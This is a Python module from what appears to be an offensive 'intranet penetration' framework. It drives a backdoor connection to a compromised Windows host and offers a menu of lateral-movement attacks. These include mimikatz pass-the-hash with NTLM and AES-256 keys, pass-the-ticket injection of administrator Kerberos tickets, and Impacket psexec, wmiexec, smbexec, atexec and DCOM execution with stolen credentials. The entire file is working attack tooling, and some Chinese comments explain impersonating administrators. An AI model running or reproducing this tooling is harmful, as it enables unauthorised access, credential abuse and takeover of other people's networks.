import os
import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI

from AuxiliaryFunctions import MyTable


class HorizontalMovement:
    def __init__(self, conn):
        commands = ["show functions", "back", "show params"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Horizontal Movement] \033[0m')
        while True:
            try:
                choice = prompt(formatted_text1, completer=completer)
                if choice == 'show functions':
                    self.show_functions()
                    continue
                elif choice == "show params":
                    self.show_params()
                    continue
                elif choice == "":
                    continue
                elif choice == 'back':
                    break
                elif choice.split()[0] == '1':
                    self.AES_256(conn, choice)
                    continue
                elif choice.split()[0] == '2':
                    self.Atexec(choice)
                    continue
                elif choice.split()[0] == '3':
                    self.DCOM(choice)
                    continue
                elif choice.split()[0] == '4':
                    self.NTLM_Hash(choice, conn)
                    continue
                elif choice.split()[0] == '5':
                    self.Psexec(choice)
                    continue
                elif choice == '6':
                    self.PTT(conn)
                    continue
                elif choice.split()[0] == '7':
                    self.Smbexec(choice)
                    continue
                elif choice.split()[0] == '8':
                    self.Wmiexec(choice)
                    continue
            except IndexError:
                print('\033[1;31;31m' + "[-] You need to offer other params." + '\033[0m')
                continue

    def show_params(self):
        print("\n" + '\033[1;34;34m' + "Parameter Description" + '\033[0m' + "\n" + '=' * len("Parameter Description") + "\n")
        headers = ['\033[1;34;34m' "Params" + '\033[0m', '\033[1;34;34m' "Description" + '\033[0m']
        mydata = [["domain_name", "域名"], ["username", "用户名"], ["AES_256", "AES256密钥"], ["password", "密码"], ["ip", "IP地址"], ["NTLM_Hash", "NTLM哈希值"]]
        MyTable.createTable(headers, mydata)

    def show_functions(self):
        print("\n" + '\033[1;34;34m' + "Horizontal Movement" + '\033[0m' + "\n" + '=' * len("Horizontal Movement") + "\n")
        headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
        mydata = [["1", "hash passing attack using AES-256 key", "1 domain_name username AES_256", "使用AES-256密钥进行哈希传递攻击"],
                  ["2", "atexec lateral movement attack", "2 username password ip", "atexec横向移动攻击"],
                  ["3", "DCOM lateral movement attack", "3 username password ip", "DCOM横向移动攻击"],
                  ["4", "NTLM_ Hash Hash Passthrough Attack", "4 username NTLM_Hash domain_name", "NTLM_Hash哈希传递攻击"],
                  ["5", "psexec lateral movement attack", "5 username password ip", "psexec横向移动攻击"],
                  ["6", "PTT ticket delivery attack", "6", "PTT票据传递攻击"],
                  ["7", "smbexec lateral movement attack", "7 username password ip", "smbexec横向移动攻击"],
                  ["8", "wmiexec lateral movement attack", "8 username password ip", "wmiexec横向移动攻击"]]
        MyTable.createTable(headers, mydata)

    # 1
    def AES_256(self, conn, choice):
        print('\033[1;34;34m' + "[!] Please ensure that patch KB2871997 has been installed on the controlled host." + '\033[0m')
        print('\033[1;34;34m' + "[*] You can run the \"sekurlsa:: ekeys\" command on mimikatz to obtain AES_256." + '\033[0m')
        commands = ["exploit"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;1;1m> \033[0m')
        while True:
            command = prompt(formatted_text1, completer=completer)
            if command == 'exploit':
                command1 = "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:" + choice.split()[2] + " /domain:" + choice.split()[1] + " /aes256:" + choice.split()[3] + "\" exit"
                self.receive(conn, command1)
                break
            elif choice == "":
                continue
        print('\033[1;32;32m' + "[+] Now you can try using 'dir' to connect to the target host" + '\033[0m')

    # 2
    def Atexec(self, choice):
        commands = ["back"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;1;1matexec > \033[0m')
        while True:
            command = prompt(formatted_text1, completer=completer)
            if command == 'back':
                break
            elif command == "":
                continue
            else:
                command1 = "python3 atexec.py " + choice.split()[1] + ":" + choice.split()[2] + "@" + choice.split()[3] + " \"" + command + "\""
                os.system(command1)

    # 3
    def DCOM(self, choice):
        command1 = "python3 dcomexec.py -object MMC20 " + choice.split()[1] + ":" + choice.split()[2] + "@" + choice.split()[3]
        os.system(command1)

    # 4
    def NTLM_Hash(self, choice, conn):
        command = "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:" + choice.split()[1] + " /domain:" + choice.split()[3] + " /ntlm:" + choice.split()[2] + "\" exit > 1.txt && type 1.txt && DEL 1.txt && exit"
        self.receive(conn, command)

    # 5
    def Psexec(self, choice):
        command = "python3 psexec.py " + choice.split()[1] + ":" + choice.split()[2] + "@" + choice.split()[3]
        os.system(command)

    # 6
    # 票据传递攻击,其思想为普通用户注入管理员的票据,从而冒充管理员身份
    def PTT(self, conn):
        # command1 = "mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"kerberos::purge\"  exit > 1.txt && type 1.txt && DEL 1.txt && md tickets && move *.kirbi tickets && exit"
        # self.receive(conn, command1)
        # print('\033[1;32;32m' + "[+] The tickets have been saved in the \"tickets\" folder.As follows:" + '\033[0m')
        # command2 = "dir tickets"
        # self.receive(conn, command2)
        print('\033[1;32;32m' + "[+] 票据传递攻击,其思想为普通用户注入管理员的票据,从而冒充管理员身份.所以在进行攻击前,我们需要先获取内存中的管理员票据,然后利用mimikatz为普通用户注入管理员的票据,从而冒充管理员身份." + '\033[0m')
        print('\033[1;32;32m' + "[+] 先清空系统票据:" + '\033[0m')
        command2 = "mimikatz.exe \"kerberos::purge\" exit"
        self.receive(conn, command2)
        print('\033[1;32;32m' + "[+] 下面要求输入管理员的票据在受害者主机上的绝对路径." + '\033[0m')
        # 需要票据的绝对路径
        path = input('\033[1;34;34m' + "[*] Input the absolute path of the administrator's ticket > " + '\033[0m')
        command3 = "mimikatz.exe \"kerberos::ptt \"" + path + "\"\" exit"
        self.receive(conn, command3)
        print('\033[1;32;32m' + "[+] Now you can try using 'dir' to connect to the target host" + '\033[0m')
        while True:
            command4 = input('\033[1;32;32m' + "PTT > " + '\033[0m')
            if command4 == 'exit':
                break
            elif command4 == "":
                continue
            self.receive(conn, command4)

    # 7
    def Smbexec(self, choice):
        command = "python3 smbexec.py " + choice.split()[1] + ":" + choice.split()[2] + "@" + choice.split()[3]
        os.system(command)

    # 8
    def Wmiexec(self, choice):
        command = "python3 wmiexec.py " + choice.split()[1] + ":" + choice.split()[2] + "@" + choice.split()[3]
        os.system(command)

    # 发送和接收函数
    def receive(self, conn, command):
        conn.sendall(command.encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                break
